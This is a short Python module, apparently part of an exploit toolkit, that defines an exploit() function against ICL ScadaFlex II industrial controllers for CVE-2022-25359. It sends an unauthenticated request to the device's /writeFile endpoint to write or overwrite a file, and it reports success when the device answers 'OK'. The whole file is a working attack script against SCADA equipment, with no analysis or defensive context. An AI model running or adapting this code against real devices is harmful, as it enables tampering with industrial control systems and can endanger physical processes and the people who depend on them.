import requests
from utils.logger import setup_logger
logger = setup_logger()

def exploit(target: str, port: int = 80, filepos: int = 1):
    """
    ICL ScadaFlex II SC-1/SC-2 1.03.07 â€“ LiquidWorm
    CVE-2022-25359
    """
    url = f"http://{target}:{port}/writeFile?filePos={filepos}&data=evil.txt"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200 and "OK" in r.text:
            logger.info("[+] ScadaFlex file write succeeded")
            return True
    except Exception as e:
        logger.error(f"ScadaFlex CRUD error: {e}")
    return False